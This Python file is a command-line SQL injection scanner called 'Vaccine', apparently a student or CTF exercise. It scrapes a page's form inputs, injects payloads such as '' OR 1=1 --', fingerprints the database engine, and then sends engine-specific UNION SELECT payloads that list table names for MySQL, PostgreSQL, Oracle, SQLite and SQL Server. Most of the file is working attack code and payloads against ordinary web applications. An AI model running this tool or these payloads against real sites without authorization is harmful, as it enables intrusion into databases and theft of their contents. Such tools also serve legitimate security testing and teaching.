import requests
import argparse
from bs4 import BeautifulSoup

injections = {
            'mariadb': "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = DATABASE() --",
            'mysql': "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = DATABASE() --",
            'postgresql': "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_catalog = current_database() --",
            'oracle': "' UNION SELECT table_name, NULL FROM all_tables --",
            'sqlite': "' UNION SELECT name, NULL FROM sqlite_master WHERE type='table' --",
            'microsoft sql server': "' UNION SELECT table_name, NULL FROM information_schema.tables",
        }

class Vaccine:
    def __init__(self, url, method='GET', archive=None):
        self.url = url
        self.method = method
        self.archive = archive or 'vulnerabilities.log'
        self.payloads = ["' OR 1=1 --", "'"]
        self.results = []
        self.database = None
        self.database_tab = ["mysql", "mariadb", "postgresql", "oracle", "sqlite", "microsoft sql server", "mongodb"]
        self.form = []

    def test_injection(self):
        before = requests.get(self.url)
        self.form = self.scrap_form()
        for input_test in self.form:
            for payload in self.payloads:
                data = {}
                for input in self.form:
                    if input != input_test:
                        data[input] = "abc"
                    else:
                        data[input] = payload
                print(data) #### value test ####
                if self.method.upper() == 'GET':
                    response = requests.get(self.url, params=data)
                elif self.method.upper() == 'POST':
                    response = requests.post(self.url, data=data)
                if self.database == None:
                    self.database = self.identify_sgbd(response)
                    if self.database:
                        self.payloads.append(injections[self.database])
                if self.is_vulnerable(before, response) == True:
                    self.results.append((self.url, payload))
                    self.log_result(self.url, payload, input_test)

    def is_vulnerable(self, before, response):

        error_messages = ["you have an error in your SQL syntax;", 
                            "unclosed quotation mark after the character string",
                            "syntax error", "warning", "welcome",
                            "failed", "flag"]
        if before.text != response.text:
            print(response.text)
            for error_message in error_messages:
                if error_message in response.text.lower():
                    return True
        return False

    def log_result(self, url, payload, input_test):
        with open(self.archive, 'a') as file:
            if self.database:
                file.write(f'Database: {self.database}\n')
            file.write(f'URL: {url}\nPayload: {payload}\nInput: {input_test}\n\n')

    def run(self):
        # print("SGDB: ", self.identify_sgbd())
        self.test_injection()
        if self.results:
            print("Vulnerabilities found")
        else:
            print(self.database)
            print("No vulnerabilities found")

    def identify_sgbd(self, after):
        response = requests.get(self.url)
        server_header = response.headers.get('Server', '').lower()
        powered_by_header = response.headers.get('X-Powered-By', '').lower()

        # Analyze HTTP headers
        for db in self.database_tab:
            if db in server_header or db in powered_by_header:
                return db

        # Analyze error messages
        error_response = after
        error_message = error_response.text.lower()
        # print(error_message)
        for db in self.database_tab:
            if db in error_message:
                return db

        return None
    
    def scrap_form(self):
        response = requests.get(self.url)
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        input_names = [input.get('name') for input in form.find_all('input') if input.get('name')]
        return input_names


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Detection Tool")
    parser.add_argument("url", help="URL to test for SQL injection")
    parser.add_argument("-X", "--method", choices=["GET", "POST"], default="GET", help="HTTP method to use")
    parser.add_argument("-o", "--archive", help="File to store the results")
    
    args = parser.parse_args()
    
    vaccine = Vaccine(url=args.url, method=args.method, archive=args.archive)
    vaccine.run()

# ' UNION SELECT name, NULL FROM sqlite_master WHERE type='table' --